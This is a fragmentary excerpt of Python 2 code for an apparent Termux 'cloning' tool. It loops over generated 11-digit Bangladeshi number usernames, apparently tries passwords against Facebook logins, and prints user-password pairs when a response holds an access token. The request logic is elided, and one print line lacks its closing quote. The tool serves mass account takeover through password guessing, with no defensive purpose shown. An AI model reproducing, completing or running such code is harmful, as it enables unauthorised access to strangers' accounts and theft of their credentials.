...
os.system('clear')
psb('\x1b[1;32mBANGLADESH MAHADI 11 DIGIT CLONING START PLEASE WAIT ..........')
for n in range(9999):
...
def menu():
    ...
    print logo
    print ''
    print 'AUTHOR   : MAHADI HASAN'
    print 'FACEBOOK : TERMUX HACKER MH'
    print 'GITHUB     : github.com/mahadi099
    print ''
    print 50* '-'
    print '[1]  \x1b[1;96mGP'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[Mahadi-OKY]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
